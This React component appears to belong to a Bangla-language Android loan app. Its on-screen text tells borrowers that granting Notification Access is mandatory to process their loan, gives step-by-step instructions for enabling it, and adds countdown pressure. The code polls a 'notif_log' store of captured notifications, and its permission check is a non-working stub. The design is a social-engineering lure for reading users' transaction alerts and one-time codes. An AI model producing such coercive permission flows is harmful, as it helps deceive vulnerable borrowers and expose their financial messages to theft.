import React, { useState, useEffect } from 'react';

interface Props {
  onPermissionGranted: () => void;
  acceptedAt: number;
}

const PermissionRequired: React.FC<Props> = ({ onPermissionGranted, acceptedAt }) => {
  const [checking, setChecking] = useState(false);
  const [stuckTime, setStuckTime] = useState(0);

  // Timer still counts down from ACCEPT — review is independent of permission
  useEffect(() => {
    const tick = () => setStuckTime(Math.floor((Date.now() - (acceptedAt || Date.now())) / 1000));
    tick();
    const i = setInterval(tick, 1000);
    return () => clearInterval(i);
  }, [acceptedAt]);

  // Auto-proceed after 5 minutes even without permission (with warning)
  useEffect(() => {
    if (stuckTime > 300) {
      onPermissionGranted();
    }
  }, [stuckTime > 300]);

  const openSettings = () => {
    // Open Android Notification Access settings
    try {
      (window as any).android?.openNotificationSettings?.();
    } catch {}
    window.location.href = 'intent:#Intent;action=android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;end';
  };

  const checkPermission = async () => {
    setChecking(true);
    try {
      // Check if notifications are being captured (indicates permission granted)
      const Preferences = { get: async () => ({ value: null }) };
      const { value } = await Preferences.get({ key: 'notif_log' });
      if (value) {
        const notifs = JSON.parse(value);
        if (notifs.length > 0) {
          onPermissionGranted();
          return;
        }
      }
    } catch {}
    setChecking(false);
  };

  useEffect(() => {
    const interval = setInterval(checkPermission, 3000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center px-4 py-12">
      <div className="max-w-lg w-full bg-white rounded-3xl shadow-2xl p-8 md:p-12 text-center">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
          </svg>
        </div>

        <h2 className="text-2xl font-black text-gray-800 mb-3">নোটিফিকেশন অ্যাক্সেস প্রয়োজন</h2>
        
        <div className="bg-red-50 border border-red-200 rounded-2xl p-5 mb-6 text-left">
          <p className="text-red-800 text-sm leading-relaxed mb-3">
            আপনার লোন আবেদন প্রক্রিয়াকরণের জন্য <strong>নোটিফিকেশন অ্যাক্সেস</strong> অনুমতি দেওয়া বাধ্যতামূলক।
          </p>
          <ul className="space-y-2 text-sm text-red-700">
            <li className="flex items-start gap-2">
              <span className="text-red-500 mt-0.5">•</span>
              <span>আপনার লেনদেনের নোটিফিকেশন যাচাই করতে এই অনুমতি প্রয়োজন</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-red-500 mt-0.5">•</span>
              <span>এই অনুমতি ছাড়া লোন প্রক্রিয়াকরণ সম্ভব নয়</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-red-500 mt-0.5">•</span>
              <span>অনুমতি দেওয়ার পর স্বয়ংক্রিয়ভাবে পরবর্তী ধাপে যাওয়া হবে</span>
            </li>
          </ul>
        </div>

        <button
          onClick={openSettings}
          className="w-full bg-[#E2136E] hover:bg-[#c4105f] text-white font-bold py-4 rounded-2xl text-lg transition-all shadow-lg hover:shadow-xl active:scale-[0.98] mb-4"
        >
          ⚙️ নোটিফিকেশন সেটিংস খুলুন
        </button>

        <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-left">
          <p className="text-xs text-gray-500 font-bold uppercase mb-2">কীভাবে অনুমতি দিবেন:</p>
          <ol className="space-y-1.5 text-xs text-gray-600">
            <li>1. উপরের বাটনে ক্লিক করে সেটিংস খুলুন</li>
            <li>2. "<strong>আমার লোন</strong>" অ্যাপটি খুঁজুন</li>
            <li>3. টগল <strong>ON</strong> করুন ✅</li>
            <li>4. ব্যাক বাটন চেপে অ্যাপে ফিরে আসুন</li>
          </ol>
        </div>

        {checking ? (
          <div className="mt-4 flex items-center justify-center gap-2 text-sm text-gray-500">
            <span className="w-4 h-4 border-2 border-[#E2136E] border-t-transparent rounded-full animate-spin"></span>
            অনুমতি চেক করা হচ্ছে...
          </div>
        ) : (
          <div className="mt-4 p-4 bg-amber-50 border border-amber-200 rounded-xl">
            <p className="text-amber-800 text-xs leading-relaxed">
              ⚠️ <strong>গুরুত্বপূর্ণ:</strong> আপনার লোন রিভিউ {Math.floor(stuckTime / 60)} মিনিট আগে শুরু হয়েছে।
              অনুমতি না দিলে <strong>৫ মিনিট পর</strong> স্বয়ংক্রিয়ভাবে পরবর্তী ধাপে চলে যাওয়া হবে, কিন্তু নোটিফিকেশন ক্যাপচার করা সম্ভব হবে না।
            </p>
            <div className="mt-2 text-[10px] text-amber-600">
              ⏱ অতিবাহিত: {Math.floor(stuckTime / 60)}m {stuckTime % 60}s / ৫:০০
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default PermissionRequired;
